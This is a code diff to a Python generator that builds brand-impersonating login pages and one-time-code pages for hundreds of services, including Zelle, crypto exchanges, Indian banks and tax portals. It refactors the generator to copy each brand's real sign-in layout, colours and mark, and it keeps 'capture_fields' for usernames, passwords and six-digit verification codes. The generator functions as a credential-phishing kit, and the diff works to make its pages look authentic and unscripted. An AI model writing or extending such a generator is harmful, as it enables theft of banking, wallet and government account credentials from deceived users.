@@ -12,6 +12,7 @@ site is one tuple - no HTML editing. Re-run to regenerate everything:
 """
 import json
 import os
+import sys
 
 
 def _out_dir():
@@ -437,13 +438,25 @@ SITES = [
     ('zelle', 'Zelle', '#6D1ED4', '#1B1B1B', 'phone', 'verification code'),
 ]
 
-# A second, larger batch of brands kept in its own module so the list can
-# grow without touching the generator. The shape is the same 5-tuple:
-#   (slug, Display Name, accent, second colour, login field, otp label)
-try:
-    from template_brands import BRANDS as _EXTRA_BRANDS
-except Exception:                      # installed copy without the module
-    _EXTRA_BRANDS = []
+# This module runs two ways: as a script (python tools/gen_templates.py, where the
+# script's own directory is already on sys.path) and as tools.gen_templates (where it is
+# not). Put the directory on the path so the sibling modules resolve either way - the
+# previous try/except silently yielded the 448 hardcoded sites when imported as a package.
+_HERE = os.path.dirname(os.path.abspath(__file__))
+if _HERE not in sys.path:
+    sys.path.insert(0, _HERE)
+
+# A second, larger batch of brands kept in its own module so the list can grow without
+# touching the generator. Same 6-tuple shape as SITES.
+from template_brands import BRANDS as _EXTRA_BRANDS  # noqa: E402
+
+# The page builder: each brand's own mark, colours and the layout its real sign-in page
+# uses (a bare centred page, a split hero, a blue header, a phone frame, a bank portal).
+from template_themes import render as _render_page  # noqa: E402
+
+# The generator's own list, kept separate: the extra batch is checked against it, and a
+# test can ask what the generator itself carries without the merged result.
+BASE_SITES = list(SITES)
 _have = {s[0] for s in SITES}
 SITES = SITES + [b for b in _EXTRA_BRANDS if b[0] not in _have]
 
@@ -454,77 +467,6 @@ FIELD_LABELS = {
     "phone":          [("phone", "Phone number", "tel", "+1 555 000 0000")],
     "email_or_phone": [("login", "Email or phone number", "text", "Email or phone number")],
 }
-
-# --------------------------------------------------------------- layouts ---
-# Real login pages are not all one shape. Three layouts (assigned per brand, not
-# at random) keep a page list from looking machine-made, and each one is a shape
-# real sites actually use: a centred card, a split hero, and a dark full-bleed.
-LAYOUT_CSS = {
-    "card": """
-  body { background:#f0f2f5; }
-""",
-    "split": """
-  body { background:#ffffff; }
-  body.split { padding:0; }
-  body.split .wrap { display:flex; min-height:100vh; width:100%; }
-  body.split .hero {
-    flex:1 1 46%; background:var(--brand); color:#fff; display:flex;
-    flex-direction:column; justify-content:center; padding:56px 48px;
-  }
-  body.split .hero .mark {
-    width:64px;height:64px;border-radius:16px;background:rgba(255,255,255,.18);
-    display:flex;align-items:center;justify-content:center;font-size:32px;
-    font-weight:700;margin-bottom:24px;
-  }
-  body.split .hero h2 { font-size:30px;line-height:1.25;margin:0 0 12px;font-weight:600; }
-  body.split .hero p { margin:0;opacity:.86;font-size:15px;line-height:1.6;max-width:34ch; }
-  body.split .side { flex:1 1 54%; display:flex;align-items:center;justify-content:center;padding:32px; }
-  body.split .card { box-shadow:none; border:1px solid #e3e6ea; max-width:420px; }
-  @media (max-width:820px) {
-    body.split .hero { display:none; }
-    body.split .side { padding:20px; }
-  }
-""",
-    "dark": """
-  body { background:#0b0d12; }
-  body.dark .card { background:#151922; color:#e7ecf3; box-shadow:0 20px 60px rgba(0,0,0,.55); }
-  body.dark h1, body.dark label { color:#e7ecf3; }
-  body.dark .sub { color:#9aa7b8; }
-  body.dark input[type=text],body.dark input[type=email],
-  body.dark input[type=tel],body.dark input[type=password] {
-    background:#0f131b; border-color:#2a3242; color:#e7ecf3;
-  }
-  body.dark .row a, body.dark .lang span { color:#9aa7b8; }
-  body.dark .foot { color:#7b8698; }
-""",
-}
-
-# brands whose real products are dark by default
-DARK_HINTS = ("crypto", "wallet", "vpn", "games", "gaming", "riot", "battle",
-              "xbox", "playstation", "nintendo", "roblox", "discord", "twitch",
-              "signal", "phantom", "metamask", "ledger", "kraken", "okx",
-              "bybit", "kucoin", "binance", "coinbase", "bitfinex", "gateio",
-              "mullvad", "nordvpn", "surfshark", "docker", "vercel", "notion",
-              "railway", "flyio", "sentry", "splunk", "grafana", "datadog",
-              "netlify", "render", "elastic", "circleci", "jenkins", "gitlab")
-
-SPLIT_HINTS = ("bank", "finance", "fintech", "insurance", "sso", "entra",
-               "okta", "onelogin", "jumpcloud", "auth0", "keycloak", "sailpoint",
-               "servicenow", "workday", "salesforce", "sap", "netsuite",
-               "oracle", "ibm", "alibaba", "tencent", "azure", "aws", "gcp",
-               "cloud", "hdfc", "axis", "kotak", "icici", "sbi", "pnb", "bob",
-               "canara", "union", "indusind", "yes", "federal", "idfc", "rbl",
-               "bandhan", "au", "epfo", "incometax", "gst", "mca", "nsdl", "cdsl")
-
-
-def pick_layout(slug, name=""):
-    blob = (slug + " " + name).lower()
-    if any(h in blob for h in DARK_HINTS):
-        return "dark"
-    if any(h in blob for h in SPLIT_HINTS):
-        return "split"
-    return "card"
-
 
 def favicon_uri(initial, brand):
     """Inline SVG favicon: a real tab icon, no external request."""
@@ -537,158 +479,6 @@ def favicon_uri(initial, brand):
     return "data:image/svg+xml," + quote(svg)
 
 
-LOGIN_HTML = """<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="robots" content="noindex,nofollow">
-<title>{page_title}</title>
-<meta name="theme-color" content="{brand}">
-<meta name="color-scheme" content="light dark">
-<meta name="referrer" content="strict-origin-when-cross-origin">
-<link rel="icon" href="{favicon}">
-<link rel="apple-touch-icon" href="{favicon}">
-<meta property="og:title" content="{page_title}">
-<meta property="og:description" content="Sign in to continue to {name}.">
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="{name}">
-<style>
-  :root {{ --brand:{brand}; --accent:{accent}; }}
-{layout_css}
-  * {{ box-sizing:border-box; }}
-  body {{
-    margin:0; min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,
-      "Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-    background:#f0f2f5; display:flex; align-items:center; justify-content:center;
-    padding:20px;
-  }}
-  .card {{
-    background:#fff; width:100%; max-width:400px; border-radius:12px;
-    box-shadow:0 12px 40px rgba(0,0,0,.10); padding:36px 32px 28px;
-  }}
-  .logo {{
-    width:52px;height:52px;border-radius:12px;background:var(--brand);
-    color:#fff;display:flex;align-items:center;justify-content:center;
-    font-size:26px;font-weight:700;margin:0 auto 18px;
-  }}
-  h1 {{ font-size:20px;margin:0 0 6px;text-align:center;color:#1c1e21;font-weight:600; }}
-  .sub {{ text-align:center;color:#65676b;font-size:14px;margin:0 0 22px; }}
-  label {{ display:block;font-size:13px;color:#65676b;margin:0 0 6px;font-weight:500; }}
-  input[type=text],input[type=email],input[type=tel],input[type=password] {{
-    width:100%;padding:13px 14px;font-size:15px;border:1px solid #ccd0d5;
-    border-radius:8px;background:#fff;outline:none;transition:border .15s;
-  }}
-  input:focus {{ border-color:var(--brand);box-shadow:0 0 0 2px color-mix(in srgb,var(--brand) 20%,transparent); }}
-  .field {{ margin-bottom:14px; }}
-  button {{
-    width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
-    background:var(--brand);border:0;border-radius:8px;cursor:pointer;margin-top:6px;
-  }}
-  button:hover {{ filter:brightness(1.06); }}
-  .row {{ display:flex;justify-content:space-between;align-items:center;margin:14px 0 4px;font-size:13px; }}
-  .row a {{ color:var(--accent);text-decoration:none; }}
-  .row label {{ margin:0;display:flex;gap:6px;align-items:center;color:#65676b; }}
-  .foot {{ text-align:center;font-size:12px;color:#8a8d91;margin-top:22px;line-height:1.6; }}
-  .lang {{ display:flex;gap:14px;justify-content:center;font-size:12px;color:#8a8d91;margin-top:18px; }}
-  .hp {{ position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }}
-</style>
-</head>
-<body class="{layout_class}">
-{hero_html}  <form class="card" method="POST" action="/" autocomplete="on" novalidate>
-    <div class="logo">{initial}</div>
-    <h1>{heading}</h1>
-    <p class="sub">{subtitle}</p>
-
-    {fields_html}
-
-    <div class="field">
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" placeholder="Password"
-             autocomplete="current-password" required>
-    </div>
-
-    <div class="row">
-      <label><input type="checkbox" name="remember" value="1" checked> Remember me</label>
-      <a href="#">Forgot password?</a>
-    </div>
-
-    <button type="submit">Log in</button>
-
-    <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
-    <input type="hidden" name="_tpl" value="{slug}">
-    <input type="hidden" name="_ts" value="__TS__">
-    <div class="foot">
-      {name} is a trademark of its respective owner.
-    </div>
-    <div class="lang"><span>English (US)</span><span>Español</span><span>Français</span></div>
-  </form>
-<script>
-/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
-   record it, and we log how long the form was open (bot forms are instant). */
-(function(){{
-  var t0 = Date.now();
-  var f = document.querySelector('form');
-  if(!f) return;
-  f.addEventListener('submit', function(){{
-    var el = f.querySelector('input[name=_ts]');
-    if(el) el.value = String(Date.now() - t0);
-  }});
-}})();
-</script>
-</body>
-</html>
-"""
-
-OTP_HTML = """<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Verify it's you - {name}</title>
-<meta name="theme-color" content="{brand}">
-<link rel="icon" href="{favicon}">
-<style>
-  :root {{ --brand:{brand}; }}
-  body {{ margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
-          background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;padding:20px; }}
-  .card {{ background:#fff;width:100%;max-width:420px;border-radius:12px;padding:36px 32px;
-           box-shadow:0 12px 40px rgba(0,0,0,.10);text-align:center; }}
-  .logo {{ width:52px;height:52px;border-radius:12px;background:var(--brand);color:#fff;
-           display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:700;margin:0 auto 18px; }}
-  h1 {{ font-size:19px;margin:0 0 8px;color:#1c1e21;font-weight:600; }}
-  p {{ color:#65676b;font-size:14px;line-height:1.5;margin:0 0 20px; }}
-  .otp {{ display:flex;gap:8px;justify-content:center;margin-bottom:18px; }}
-  .otp input {{ width:44px;height:52px;text-align:center;font-size:20px;border:1px solid #ccd0d5;border-radius:8px;outline:none; }}
-  .otp input:focus {{ border-color:var(--brand); }}
-  button {{ width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;background:var(--brand);
-            border:0;border-radius:8px;cursor:pointer; }}
-  .resend {{ margin-top:14px;font-size:13px;color:#65676b; }}
-  .resend a {{ color:var(--brand);text-decoration:none; }}
-  .foot {{ font-size:11px;color:#8a8d91;margin-top:22px; }}
-</style>
-</head>
-<body>
-<form class="card" method="POST" action="/">
-  <div class="logo">{initial}</div>
-  <h1>Enter your {otp_label}</h1>
-  <p>We sent a {otp_label} to your phone and email.<br>Enter it below to finish signing in to {name}.</p>
-  <div class="otp">
-    <input name="otp_1" maxlength="1" inputmode="numeric" autofocus>
-    <input name="otp_2" maxlength="1" inputmode="numeric">
-    <input name="otp_3" maxlength="1" inputmode="numeric">
-    <input name="otp_4" maxlength="1" inputmode="numeric">
-    <input name="otp_5" maxlength="1" inputmode="numeric">
-    <input name="otp_6" maxlength="1" inputmode="numeric">
-  </div>
-  <button type="submit">Verify</button>
-  <input type="hidden" name="_tpl" value="{slug}">
-  <div class="resend">Didn't get a code? <a href="#">Resend</a></div>
-</form>
-</body>
-</html>
-"""
-
 SUBTITLES = {
     "email":          "Sign in with your email",
     "username":       "Sign in with your username",
@@ -698,42 +488,17 @@ SUBTITLES = {
 
 
 def build_site(slug, name, brand, accent, login_with, otp_label):
+    """The three files for one brand: the login page, the code page and the field map.
+
+    The page follows the layout that brand's real sign-in page uses, with the brand's
+    own mark and colours (tools/template_themes.py). It carries the hidden template id,
+    the honeypot field and the timing beacon the server and the tests rely on.
+    """
     initial = name[0].upper()
-    fields_html = []
-    for fname, flabel, ftype, fph in FIELD_LABELS[login_with]:
-        fields_html.append(
-            f'    <div class="field">\n'
-            f'      <label for="{fname}">{flabel}</label>\n'
-            f'      <input id="{fname}" name="{fname}" type="{ftype}" placeholder="{fph}" '
-            f'autocomplete="username" required>\n'
-            f'    </div>'
-        )
-    layout = pick_layout(slug, name)
-    hero = ""
-    layout_class = layout
-    if layout == "split":
-        hero = (
-            '  <div class="wrap">\n'
-            f'    <div class="hero"><div class="mark">{initial}</div>'
-            f'<h2>One account for everything in {name}</h2>'
-            "<p>Sign in to reach your dashboard, files and settings - "
-            "the same credentials you already use on the web.</p></div>\n"
-            '    <div class="side">\n'
-        )
-    heading = f"Log in to {name}" if layout != "split" else "Sign in"
-    html = LOGIN_HTML.format(
-        name=name, slug=slug, brand=brand, accent=accent, initial=initial,
-        subtitle=SUBTITLES[login_with], fields_html="\n".join(fields_html),
-        page_title=f"Log in to {name}", favicon=favicon_uri(initial, brand),
-        layout_css=LAYOUT_CSS[layout], layout_class=layout_class,
-        hero_html=hero, heading=heading,
-    )
-    if layout == "split":
-        html = html.replace("  </form>\n<script>",
-                            "    </div>\n  </div>\n  </form>\n<script>", 1)
-    otp_html = OTP_HTML.format(name=name, slug=slug, brand=brand,
-                               initial=initial, otp_label=otp_label,
-                               favicon=favicon_uri(initial, brand))
+    favicon = favicon_uri(initial, brand)
+    html, otp_html = _render_page(slug, name, brand, accent, login_with, otp_label,
+                                  FIELD_LABELS[login_with], SUBTITLES[login_with],
+                                  favicon)
     fields_json = {
         "capture_fields": [f[0] for f in FIELD_LABELS[login_with]] + ["password"],
         "otp_fields": [f"otp_{i}" for i in range(1, 7)],
